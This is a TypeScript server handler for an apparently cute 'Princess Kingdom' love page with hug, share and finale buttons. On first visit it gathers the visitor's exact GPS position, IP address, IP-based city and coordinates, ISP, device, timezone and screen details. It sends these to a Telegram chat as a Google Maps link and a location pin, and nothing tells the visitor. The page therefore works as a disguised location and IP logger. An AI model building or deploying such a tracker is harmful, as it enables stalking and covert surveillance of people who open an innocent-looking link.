import type { IncomingMessage, ServerResponse } from 'node:http';

export type NotifyEventType = 'first_visit' | 'send_hug' | 'share_love' | 'tap_for_love';

interface IpGeoResult {
  city?: string;
  region?: string;
  country?: string;
  postal?: string;
  latitude?: number;
  longitude?: number;
  isp?: string;
}

const recentNotifyMap = new Map<string, number>();
const FIRST_VISIT_COOLDOWN_MS = 10 * 60 * 1000;
const BUTTON_COOLDOWN_MS = 2500;

function extractClientIp(req: IncomingMessage): string {
  const forwarded = req.headers['x-forwarded-for'];
  const raw = Array.isArray(forwarded) ? forwarded[0] : forwarded;
  if (typeof raw === 'string' && raw.trim()) {
    return raw.split(',')[0].trim();
  }
  const realIp = req.headers['x-real-ip'];
  if (typeof realIp === 'string' && realIp.trim()) {
    return realIp.trim();
  }
  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
}

function isPrivateOrLocalIp(ip: string): boolean {
  if (!ip) return true;
  if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') return true;
  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('fc') || ip.startsWith('fd')) {
    return true;
  }
  const match172 = /^172\.(\d+)\./.exec(ip);
  if (match172) {
    const second = Number(match172[1]);
    if (second >= 16 && second <= 31) return true;
  }
  return false;
}

async function lookupIpGeolocation(ip: string): Promise<IpGeoResult | null> {
  if (isPrivateOrLocalIp(ip)) return null;
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 3500);
    const res = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
      signal: controller.signal,
    });
    clearTimeout(timer);
    if (!res.ok) return null;
    const data = (await res.json()) as {
      success?: boolean;
      city?: string;
      region?: string;
      country?: string;
      postal?: string;
      latitude?: number;
      longitude?: number;
      connection?: { isp?: string; org?: string };
    };
    if (!data.success) return null;
    return {
      city: data.city,
      region: data.region,
      country: data.country,
      postal: data.postal,
      latitude: typeof data.latitude === 'number' ? data.latitude : undefined,
      longitude: typeof data.longitude === 'number' ? data.longitude : undefined,
      isp: data.connection?.isp || data.connection?.org,
    };
  } catch {
    return null;
  }
}

function escapeTelegramHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function readJsonBody(req: IncomingMessage & { body?: unknown }): Promise<Record<string, unknown>> {
  if (req.body && typeof req.body === 'object') {
    return Promise.resolve(req.body as Record<string, unknown>);
  }
  if (typeof req.body === 'string') {
    try {
      const parsed = JSON.parse(req.body) as unknown;
      return Promise.resolve(parsed && typeof parsed === 'object' ? (parsed as Record<string, unknown>) : {});
    } catch {
      return Promise.resolve({});
    }
  }
  return new Promise((resolve) => {
    const chunks: Buffer[] = [];
    let totalBytes = 0;
    req.on('data', (chunk: Buffer) => {
      totalBytes += chunk.length;
      if (totalBytes <= 16384) {
        chunks.push(chunk);
      }
    });
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString('utf8');
        const parsed = JSON.parse(raw) as unknown;
        resolve(parsed && typeof parsed === 'object' ? (parsed as Record<string, unknown>) : {});
      } catch {
        resolve({});
      }
    });
    req.on('error', () => resolve({}));
  });
}

function sendJson(res: ServerResponse, status: number, payload: unknown): void {
  res.statusCode = status;
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.end(JSON.stringify(payload));
}

export async function handleTelegramNotify(
  req: IncomingMessage & { body?: unknown },
  res: ServerResponse
): Promise<void> {
  if (req.method !== 'POST') {
    sendJson(res, 405, { ok: false, error: 'Method not allowed' });
    return;
  }

  const body = await readJsonBody(req);
  const rawEvent = typeof body.event === 'string' ? body.event : 'first_visit';
  const eventType: NotifyEventType =
    rawEvent === 'send_hug' || rawEvent === 'share_love' || rawEvent === 'tap_for_love'
      ? rawEvent
      : 'first_visit';

  const clientIp = extractClientIp(req);
  const now = Date.now();
  const cooldownMs = eventType === 'first_visit' ? FIRST_VISIT_COOLDOWN_MS : BUTTON_COOLDOWN_MS;
  const throttleKey = `${clientIp || 'unknown'}:${eventType}`;
  const lastSentAt = recentNotifyMap.get(throttleKey);
  if (lastSentAt && now - lastSentAt < cooldownMs) {
    sendJson(res, 200, { ok: true, notified: false, deduplicated: true });
    return;
  }
  recentNotifyMap.set(throttleKey, now);
  if (recentNotifyMap.size > 500) {
    for (const [k, ts] of recentNotifyMap.entries()) {
      if (now - ts > FIRST_VISIT_COOLDOWN_MS) recentNotifyMap.delete(k);
    }
  }

  const botToken = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID || '').trim();

  const timezone = typeof body.timezone === 'string' ? body.timezone.slice(0, 80) : 'Unknown';
  const language = typeof body.language === 'string' ? body.language.slice(0, 40) : 'Unknown';
  const screen = typeof body.screen === 'string' ? body.screen.slice(0, 40) : 'Unknown';
  const pageUrl = typeof body.pageUrl === 'string' ? body.pageUrl.slice(0, 300) : '';
  const displayName = typeof body.displayName === 'string' && body.displayName.trim()
    ? body.displayName.trim().slice(0, 60)
    : 'The Princess Kingdom';
  const buttonLabel = typeof body.buttonLabel === 'string' && body.buttonLabel.trim()
    ? body.buttonLabel.trim().slice(0, 60)
    : '';
  const hugCount =
    typeof body.hugCount === 'number' && Number.isFinite(body.hugCount) && body.hugCount > 0
      ? Math.round(body.hugCount)
      : null;
  const tapCount =
    typeof body.tapCount === 'number' && Number.isFinite(body.tapCount) && body.tapCount > 0
      ? Math.round(body.tapCount)
      : null;
  const shareCopied = typeof body.shareCopied === 'boolean' ? body.shareCopied : null;
  const finaleTitle =
    typeof body.finaleTitle === 'string' && body.finaleTitle.trim()
      ? body.finaleTitle.trim().slice(0, 160)
      : '';
  const customMessage =
    typeof body.customMessage === 'string' && body.customMessage.trim()
      ? body.customMessage.trim().slice(0, 300)
      : '';
  const userAgent = String(req.headers['user-agent'] || 'Unknown').slice(0, 180);

  // Only first_visit captures and sends geolocation (GPS or IP fallback)
  let hasExactGps = false;
  let pinLat: number | null = null;
  let pinLng: number | null = null;
  let gpsAccuracy: number | null = null;
  let messageLines: string[] = [];

  if (eventType === 'first_visit') {
    const gpsObj =
      body.gps && typeof body.gps === 'object'
        ? (body.gps as { latitude?: unknown; longitude?: unknown; accuracy?: unknown })
        : null;
    const gpsLat =
      typeof gpsObj?.latitude === 'number' && Number.isFinite(gpsObj.latitude) ? gpsObj.latitude : null;
    const gpsLng =
      typeof gpsObj?.longitude === 'number' && Number.isFinite(gpsObj.longitude) ? gpsObj.longitude : null;
    gpsAccuracy =
      typeof gpsObj?.accuracy === 'number' && Number.isFinite(gpsObj.accuracy)
        ? Math.round(gpsObj.accuracy)
        : null;

    hasExactGps =
      gpsLat !== null &&
      gpsLng !== null &&
      gpsLat >= -90 &&
      gpsLat <= 90 &&
      gpsLng >= -180 &&
      gpsLng <= 180;

    const vercelCity = typeof req.headers['x-vercel-ip-city'] === 'string'
      ? decodeURIComponent(req.headers['x-vercel-ip-city'])
      : '';
    const vercelRegion = typeof req.headers['x-vercel-ip-country-region'] === 'string'
      ? req.headers['x-vercel-ip-country-region']
      : '';
    const vercelCountry = typeof req.headers['x-vercel-ip-country'] === 'string'
      ? req.headers['x-vercel-ip-country']
      : '';
    const vercelLat = typeof req.headers['x-vercel-ip-latitude'] === 'string'
      ? Number(req.headers['x-vercel-ip-latitude'])
      : NaN;
    const vercelLng = typeof req.headers['x-vercel-ip-longitude'] === 'string'
      ? Number(req.headers['x-vercel-ip-longitude'])
      : NaN;

    const ipGeo = await lookupIpGeolocation(clientIp);
    const city = ipGeo?.city || vercelCity;
    const region = ipGeo?.region || vercelRegion;
    const country = ipGeo?.country || vercelCountry;
    const ipPlace = [city, region, country].filter(Boolean).join(', ') || 'Unavailable (local/private IP)';

    pinLat = hasExactGps
      ? gpsLat!
      : ipGeo?.latitude !== undefined
        ? ipGeo.latitude
        : Number.isFinite(vercelLat)
          ? vercelLat
          : null;
    pinLng = hasExactGps
      ? gpsLng!
      : ipGeo?.longitude !== undefined
        ? ipGeo.longitude
        : Number.isFinite(vercelLng)
          ? vercelLng
          : null;

    const mapsUrl =
      pinLat !== null && pinLng !== null
        ? `https://www.google.com/maps?q=${pinLat},${pinLng}`
        : null;
    const gpsStatus = typeof body.gpsStatus === 'string' ? body.gpsStatus.slice(0, 40) : 'unavailable';
    const locationAccuracyText = hasExactGps
      ? `Exact GPS (${gpsLat!.toFixed(6)}, ${gpsLng!.toFixed(6)}, ±${gpsAccuracy ?? '?'}m)`
      : `Approximate IP (${gpsStatus})`;

    messageLines = [
      `👀 <b>First-Time Visitor Opened ${escapeTelegramHtml(displayName)}!</b>`,
      '',
      `<b>Location Mode:</b> ${escapeTelegramHtml(locationAccuracyText)}`,
      `<b>Area / City:</b> ${escapeTelegramHtml(ipPlace)}`,
      mapsUrl ? `<b>Google Maps:</b> <a href="${escapeTelegramHtml(mapsUrl)}">Open Location Pin</a>` : '',
      `<b>IP:</b> <code>${escapeTelegramHtml(clientIp || 'Unknown')}</code>`,
      ipGeo?.isp ? `<b>ISP:</b> ${escapeTelegramHtml(ipGeo.isp)}` : '',
      `<b>Timezone:</b> ${escapeTelegramHtml(timezone)}`,
      `<b>Language:</b> ${escapeTelegramHtml(language)} | <b>Screen:</b> ${escapeTelegramHtml(screen)}`,
      pageUrl ? `<b>Site:</b> ${escapeTelegramHtml(pageUrl)}` : '',
      `<b>Device:</b> ${escapeTelegramHtml(userAgent)}`,
      `<b>Time (UTC):</b> ${escapeTelegramHtml(new Date(now).toISOString())}`,
    ].filter(Boolean);
  } else if (eventType === 'send_hug') {
    const label = buttonLabel || 'Send a hug';
    messageLines = [
      `🤗💖 <b>Warm Royal Hug Delivered!</b>`,
      '',
      customMessage
        ? escapeTelegramHtml(customMessage)
        : `Someone wrapped <b>${escapeTelegramHtml(displayName)}</b> in a warm hug using the <b>"${escapeTelegramHtml(label)}"</b> button.`,
      hugCount ? `<b>Total Kingdom Hugs:</b> #${hugCount.toLocaleString()}` : '',
      `<b>Floating Effect:</b> Warm Hug Wave (🤗 🫂 💖 💕 🌷)`,
      `<b>Visitor Timezone:</b> ${escapeTelegramHtml(timezone)}`,
      pageUrl ? `<b>Site:</b> ${escapeTelegramHtml(pageUrl)}` : '',
      `<b>Time (UTC):</b> ${escapeTelegramHtml(new Date(now).toISOString())}`,
    ].filter(Boolean);
  } else if (eventType === 'share_love') {
    const label = buttonLabel || 'Share love';
    const shareOutcome =
      shareCopied === true
        ? 'Copied the Kingdom link to clipboard so it can be shared with someone special 📋'
        : 'Triggered a sparkle love share across the Kingdom ✨';
    messageLines = [
      `💌✨ <b>Someone Shared Your Kingdom!</b>`,
      '',
      customMessage
        ? escapeTelegramHtml(customMessage)
        : `A visitor clicked <b>"${escapeTelegramHtml(label)}"</b> on <b>${escapeTelegramHtml(displayName)}</b>'s page to spread the love.`,
      `<b>Action Taken:</b> ${escapeTelegramHtml(shareOutcome)}`,
      `<b>Section:</b> Profile Stats & Love Actions`,
      `<b>Floating Effect:</b> Diagonal Sparkle Spin (💌 ✨ 🌸 💗 🕊️ 🌹)`,
      pageUrl ? `<b>Shared Link:</b> ${escapeTelegramHtml(pageUrl)}` : '',
      `<b>Visitor Timezone:</b> ${escapeTelegramHtml(timezone)}`,
      `<b>Time (UTC):</b> ${escapeTelegramHtml(new Date(now).toISOString())}`,
    ].filter(Boolean);
  } else {
    const label = buttonLabel || 'Tap for love 💖';
    messageLines = [
      `👑💜 <b>Royal Finale Love Shower!</b>`,
      '',
      customMessage
        ? escapeTelegramHtml(customMessage)
        : `Someone scrolled all the way to the finale and tapped <b>"${escapeTelegramHtml(label)}"</b> for <b>${escapeTelegramHtml(displayName)}</b>!`,
      tapCount ? `<b>Finale Taps This Visit:</b> #${tapCount.toLocaleString()}` : '',
      finaleTitle ? `<b>Finale Headline:</b> "${escapeTelegramHtml(finaleTitle)}"` : '',
      `<b>Section:</b> Royal Finale Celebration`,
      `<b>Floating Effect:</b> Royal Cascade Shower (👑 💜 🪻 ✨ 💎 💕)`,
      `<b>Visitor Timezone:</b> ${escapeTelegramHtml(timezone)}`,
      pageUrl ? `<b>Site:</b> ${escapeTelegramHtml(pageUrl)}` : '',
      `<b>Time (UTC):</b> ${escapeTelegramHtml(new Date(now).toISOString())}`,
    ].filter(Boolean);
  }

  if (!botToken || !chatId) {
    sendJson(res, 200, {
      ok: true,
      notified: false,
      event: eventType,
      locationType: eventType === 'first_visit' ? (hasExactGps ? 'gps' : pinLat !== null ? 'ip' : 'unknown') : 'none',
      reason: 'telegram_not_configured',
    });
    return;
  }

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${encodeURIComponent(botToken)}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageLines.join('\n'),
        parse_mode: 'HTML',
        disable_web_page_preview: false,
      }),
    });

    if (!tgRes.ok) {
      const errText = await tgRes.text().catch(() => '');
      console.warn('Telegram sendMessage failed:', tgRes.status, errText.slice(0, 200));
      sendJson(res, 200, {
        ok: true,
        notified: false,
        event: eventType,
        locationType: eventType === 'first_visit' ? (hasExactGps ? 'gps' : pinLat !== null ? 'ip' : 'unknown') : 'none',
        reason: `telegram_http_${tgRes.status}`,
      });
      return;
    }

    // Only send native Telegram location pin on first_visit
    if (eventType === 'first_visit' && pinLat !== null && pinLng !== null) {
      await fetch(`https://api.telegram.org/bot${encodeURIComponent(botToken)}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: pinLat,
          longitude: pinLng,
          ...(hasExactGps && gpsAccuracy !== null ? { horizontal_accuracy: Math.min(1500, gpsAccuracy) } : {}),
        }),
      }).catch(() => undefined);
    }

    sendJson(res, 200, {
      ok: true,
      notified: true,
      event: eventType,
      locationType: eventType === 'first_visit' ? (hasExactGps ? 'gps' : pinLat !== null ? 'ip' : 'unknown') : 'none',
    });
  } catch (err) {
    console.warn('Telegram notify error:', err);
    sendJson(res, 200, {
      ok: true,
      notified: false,
      event: eventType,
      locationType: eventType === 'first_visit' ? (hasExactGps ? 'gps' : pinLat !== null ? 'ip' : 'unknown') : 'none',
      reason: 'telegram_network_error',
    });
  }
}
